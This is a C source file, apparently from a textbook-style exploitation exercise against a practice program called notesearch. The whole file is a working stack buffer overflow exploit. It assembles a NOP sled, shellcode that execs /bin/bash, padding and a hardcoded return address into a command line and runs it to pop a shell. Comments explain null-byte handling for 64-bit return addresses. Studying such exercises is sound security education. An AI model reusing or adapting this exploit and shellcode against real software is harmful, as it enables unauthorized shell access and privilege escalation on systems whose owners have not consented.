#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Taking the insights from memaddress.py script to build
// the exploit in C

// note: filling the buffer with a 64bit return address will break
// the exploit because of the necessary null bytes
// therefore the correct postion of the return add is necessary
// the returnaddress stored in ret is the address_base - the decrement value
// determined in memaddress.py

char shellcode[]=
"\xeb\x0b\x5f\x48\x31\xd2\x52\x5e\x6a\x3b\x58\x0f\x05\xe8\xf0"
"\xff\xff\xff\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x2f\x2f\x2f\x62\x61\x73\x68";

int main(int argc, char *argv[]) {
   unsigned int i, *ptr, offset=190;
   unsigned long ret;
   char *command, *buffer;

   command = (char *) malloc(200);
   bzero(command, 200); // zero out the new memory

   strcpy(command, "./notesearch \'"); // start command buffer
   buffer = command + strlen(command); // set buffer at the end

   if(argc > 1) // set offset
      offset = atoi(argv[1]);

   ret = 0x00007fffffffe490; // set return address

   //for(i=0; i < 160; i+=8) // fill buffer with return address
    //  *((unsigned long *)(buffer+i)) = ret;
   memset(buffer, 0x90, 56); // build NOP sled
   memcpy(buffer+56, shellcode, sizeof(shellcode)-1);
   memset(buffer+56+sizeof(shellcode)-1, 0x41, 120-56-sizeof(shellcode)-1+2);
   memcpy(buffer+120, &ret, 6);
   strcat(command, "\'");

   system(command); // run exploit
   free(command);
}
